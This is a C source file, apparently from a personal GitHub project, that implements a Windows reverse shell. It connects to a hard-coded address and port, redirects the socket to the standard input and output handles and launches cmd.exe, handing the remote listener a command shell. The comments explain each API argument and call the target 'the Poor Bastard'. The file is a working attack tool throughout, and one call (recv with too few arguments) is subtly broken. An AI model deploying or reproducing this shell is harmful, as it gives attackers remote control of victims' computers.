/*
    Author:    lemur
    GitHub:    https://github.com/1emvr
    Email:     1emvr@protonmail.com
    Date:      01/02/2023  05:15 AM

    'Simple' WinAPI reverse shell :)
    Might have to come back and do some cleanup as well.

    Most definitions are from https://learn.microsoft.com
*/
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

int main() {

    // Defining Datatypes for Handlers
    SOCKET socket;
    WSADATA ws_api;
    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;

    // Connection Related Definitions
    char recv_server[512];
    char reverse_addr[] = "10.51.51.190"; 
    int port = 8081;

    // Internet Socket Address Struct
    struct sockaddr_in shell_connect_info;

    // Winsock API Startup
    WSAStartup(MAKEWORD(2,2), &ws_api);

    socket = WSASocket(
/*
    Arguments for WSASocket():

        1.The address family specified (ipv4),
        2.Type of stream for the new socket,
        3.Protocol Type, being two-way "stateful" TCP,
        4.A pointer to WSAPROTOCOL_INFO (associated provider info),
        5.An existing socket group ID. Since it's set to NULL, not sure why we're casting,
        6.Flags set to specify additional socket attributes
*/
        AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL
/*
        According to Microsoft: If no error occurs, WSASocket returns a descriptor
        referencing the new socket. Otherwise, a value of INVALID_SOCKET is returned,
        and a specific error code can be retrieved by calling "WSAGetLastError"
*/
    );

    // Sockaddr Definitions for the Poor Bastard
    shell_connect_info.sin_port = htons(port);
    shell_connect_info.sin_family = AF_INET;
    shell_connect_info.sin_addr.s_addr = inet_addr(reverse_addr);

    int connection = WSAConnect(
/*
    Arguments for WSAConnect():

        1.Descriptor identifying the unconnected socket,
        2.A pointer to our sockaddr definitions
        3.The length of those definitions
        4.Callee Data
        5.Quality of Service Data
        6.Uhhh, Unknown FLOWSPEC thing.
*/
        socket, (SOCKADDR *) &shell_connect_info, sizeof(shell_connect_info), NULL, NULL, NULL, NULL);
    
    // Error Handling
    if(connection == SOCKET_ERROR) {
        printf("Connection to target server failed\n"); exit(0);
    } 
    else {

        recv(socket, recv_server);
        memset(&startup_info, 0, sizeof(startup_info));

        startup_info.cb = sizeof(startup_info);
        startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE) socket;
/*
    Definitions for STARTUPINFO handle. These are set for preparation of CreateProcess():

    Cb specifies the size in bytes of the struct. 
    dwFlags determines specific members of struct when window's created:

            STARTF_USESTDHANDLES is just stdio handle.
            STARTF_USESHOWWINDOW shows a window.

    hStdInput defines all stdio be parsed through "socket"
*/
        
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);
/*
    Arguments for CreateProcess():

        1.No module,
        2.Argument to pass,
        3.Process handle not inheritable,
        4.Thread handle not inheritable,
        5.Set handle inheritance to True,
        6.Use parent's environment block,
        7.User parent's starting directory,
        8.Point to STARTUPINFO struct,
        9.Point to PROCESS_INFORMATION struct
*/
        WaitForSingleObject(process_info.hProcess, INFINITE);
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);

        memset(recv_server, 0, sizeof(recv_server));
    }
}